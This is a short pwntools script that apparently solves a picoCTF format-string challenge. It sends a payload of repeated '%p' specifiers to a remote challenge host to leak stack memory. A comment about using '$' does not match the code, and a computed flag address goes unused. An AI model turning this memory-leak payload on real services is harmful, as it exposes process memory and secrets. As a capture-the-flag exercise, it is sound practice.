from pwn import *

context.binary = ELF("format-string-1")

print(context.binary)
print(hex(context.binary.symbols['main']))
flag_location = context.binary.symbols['main'] + 1024 + 64
flag_hex = hex(flag_location)
print(flag_hex)

# Correct payload formatting
payload = b''
for i in range(1, 21):
    payload += f"|%p|".encode()  # use $ to access stack args directly

print("Payload:", payload)
p = remote('mimas.picoctf.net', 61512)
val = p.recv()
print(val)
p.sendline(payload)
val = p.recv()
print(val)

